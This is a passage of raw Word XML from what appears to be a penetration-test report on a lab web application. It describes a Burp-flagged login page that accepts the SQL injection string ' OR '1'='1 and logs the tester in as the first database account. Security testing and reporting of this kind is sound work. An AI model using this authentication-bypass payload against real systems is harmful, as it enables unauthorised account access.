        <w:t>insertProduct.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="21BC2FB7" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B21C53">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B21C53">
        <w:t>insertWarehouse.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6ED5276F" w14:textId="1C197605" w:rsidR="00D03EAD" w:rsidRPr="00F85CF1" w:rsidRDefault="00D03EAD" w:rsidP="00F85CF1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B21C53">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B21C53">
        <w:t>insertCategory.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="681CF152" w14:textId="4012C532" w:rsidR="00E14B42" w:rsidRDefault="00F85CF1" w:rsidP="00E14B42">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">One of the pages that </w:t>
      </w:r>
      <w:r w:rsidR="00D03EAD">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Burp indicated may</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> be vuln</w:t>
      </w:r>
      <w:r w:rsidR="004208DE">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>erable to SQL injection is the l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">ogin page. If this page accepts SQL injection, then it could </w:t>
      </w:r>
      <w:r w:rsidR="004208DE">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">potentially </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>be used to bypass authentication for an account.</w:t>
      </w:r>
      <w:r w:rsidR="004208DE" w:rsidRPr="004208DE">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004208DE">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>The webpage was supplied with a valid username, and then the SQL syntax used previously was inserted into the password field.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B23F55E" w14:textId="77777777" w:rsidR="004208DE" w:rsidRDefault="004208DE" w:rsidP="00E14B42">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="604215F3" w14:textId="1547D585" w:rsidR="00E14B42" w:rsidRDefault="00E14B42" w:rsidP="00E14B42">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>The first</w:t>
      </w:r>
      <w:r w:rsidR="004C2771">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> two results processed normally and did not</w:t>
      </w:r>
      <w:r w:rsidR="004208DE">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> allow the user to log</w:t>
      </w:r>
      <w:r w:rsidR="004C2771">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> in.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> Howev</w:t>
      </w:r>
      <w:r w:rsidR="004C2771">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>er, the third result logged the user in successfully</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D1084C" w14:textId="77777777" w:rsidR="00F85CF1" w:rsidRDefault="00F85CF1" w:rsidP="00056157">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BA5A337" w14:textId="4E664D3A" w:rsidR="00056157" w:rsidRDefault="00E14B42" w:rsidP="00056157">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="00056157" w:rsidRPr="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r w:rsidR="00B14C2C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>syntax</w:t>
      </w:r>
      <w:r w:rsidR="00056157" w:rsidRPr="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>' OR '1'='1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00056157" w:rsidRPr="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="004C2771">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> inserted</w:t>
      </w:r>
      <w:r w:rsidR="00056157" w:rsidRPr="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> in</w:t>
      </w:r>
      <w:r w:rsidR="00B14C2C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> both the login and password fields.</w:t>
      </w:r>
      <w:r w:rsidR="00056157" w:rsidRPr="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B14C2C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="00056157" w:rsidRPr="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">he server incorrectly processes </w:t>
      </w:r>
      <w:r w:rsidR="004C2771" w:rsidRPr="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>this and</w:t>
      </w:r>
      <w:r w:rsidR="00056157" w:rsidRPr="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> accepts the SQL syntax</w:t>
      </w:r>
      <w:r w:rsidR="004C2771">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> as valid input</w:t>
      </w:r>
      <w:r w:rsidR="00056157" w:rsidRPr="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>. This forces the web</w:t>
      </w:r>
      <w:r w:rsidR="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r w:rsidR="00056157" w:rsidRPr="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">age to login successfully. The account that </w:t>
      </w:r>
      <w:r w:rsidR="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">the user </w:t>
      </w:r>
      <w:r w:rsidR="00B14C2C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>gets</w:t>
      </w:r>
      <w:r w:rsidR="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> logged in a</w:t>
      </w:r>
      <w:r w:rsidR="00056157" w:rsidRPr="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="004C2771">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="00056157" w:rsidRPr="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004C2771">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>the</w:t>
      </w:r>
      <w:r w:rsidR="00056157" w:rsidRPr="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F85CF1" w:rsidRPr="00E60461">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>hacklab@hacklab.com</w:t>
      </w:r>
      <w:r w:rsidR="004C2771">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> account</w:t>
      </w:r>
      <w:r w:rsidR="00056157" w:rsidRPr="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5773A364" w14:textId="4D49B9FC" w:rsidR="00F85CF1" w:rsidRDefault="00F85CF1" w:rsidP="00056157">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2070CF77" w14:textId="5DF444FD" w:rsidR="00F85CF1" w:rsidRDefault="00771827" w:rsidP="00056157">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00B14C2C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>24</w:t>
      </w:r>
      <w:r w:rsidR="00F85CF1">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> shows that the first account in the database is the hacklab@hacklab.com account. </w:t>
      </w:r>
      <w:r w:rsidR="007C3AFD">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">This implies that the reason the </w:t>
      </w:r>
      <w:r w:rsidR="00B14C2C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>user was logged</w:t>
      </w:r>
      <w:r w:rsidR="007C3AFD">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> in as the hacklab account is because it is the first account in the database. To test this theory</w:t>
      </w:r>
      <w:r w:rsidR="00B14C2C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00F85CF1">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r w:rsidR="00CD7DEB">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>he hacklab account is deleted a</w:t>
      </w:r>
      <w:r w:rsidR="00F85CF1">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>nd t</w:t>
      </w:r>
      <w:r w:rsidR="00CD7DEB">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r w:rsidR="00F85CF1">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">SQL injection is run again. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B3DA76" w14:textId="77777777" w:rsidR="00CD7DEB" w:rsidRDefault="00CD7DEB" w:rsidP="00CD7DEB">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="06F66598" wp14:editId="25424437">
            <wp:extent cx="5943600" cy="1228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228090"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="067336B3" w14:textId="27F54B11" w:rsidR="00CD7DEB" w:rsidRDefault="00CD7DEB" w:rsidP="00CD7DEB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
